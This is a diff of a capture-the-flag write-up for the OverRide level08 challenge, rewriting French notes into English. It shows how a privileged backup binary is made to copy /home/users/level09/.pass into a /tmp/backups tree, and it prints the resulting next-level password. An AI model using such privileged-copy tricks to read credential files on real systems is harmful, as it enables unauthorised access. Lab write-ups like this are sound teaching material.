@@ -1,29 +1,27 @@
-dans cet exercice on remarque sur dogbolt que level8 ouvre un fichier et ecrit son contenu dans le meme path dans un directory appele backups
-on regarde la permission du fichier on remarque qu'il a les droit du level 9 on va donc essayer de l'ouvrir :
+After opening the binary in dogbolt we can see that the program take a path in parameter and copy that file in a folder backup that has the same parent structure.
+So if I want to copy `myfile`:
+`/folder1/folder2/myfile`
+There must be a folder `backups` containing `/folder1/folder2/` like:
+`./backups/folder1/folder2/`
+Where you are
 
-```
+Since we know that the binary has the permission to open `/home/users/level09/.pass`
+We will try to copy the `.pass` file
+
+```Shell
 level08@OverRide:~$ ./level08 /home/users/level09/.pass
 ERROR: Failed to open ./backups//home/users/level09/.pass
 ```
-on va donc essayer d'effectuer la commande dans tmp avec les directory cree
-```
 
+Here we see that it doesn't work because the `/home/users/level0` folder are missing in the `./backups` folder.
+So we will try to use the command in the `/tmp` directory so that we can create the `./backups/home/users/level0` folders.
+
+```Shell
 level08@OverRide:~$ cd /tmp
-level08@OverRide:/tmp$ ls
-level08@OverRide:/tmp$ ~/level08 ../home/users/level09/.pass
-ERROR: Failed to open ./backups/.log
-level08@OverRide:/tmp$ mkdir backups
-level08@OverRide:/tmp$ ./level08 /home/users/level09/.pass
--bash: ./level08: No such file or directory
 level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
 ERROR: Failed to open ./backups//home/users/level09/.pass
-level08@OverRide:/tmp$ mkdir backups/home
-level08@OverRide:/tmp$ mkdir backups/home/users
-level08@OverRide:/tmp$ mkdir backups/home/users/level09
+level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
 level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
-level08@OverRide:/tmp$ cat backups/
-home/ .log  
 level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
 fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
-
 ```
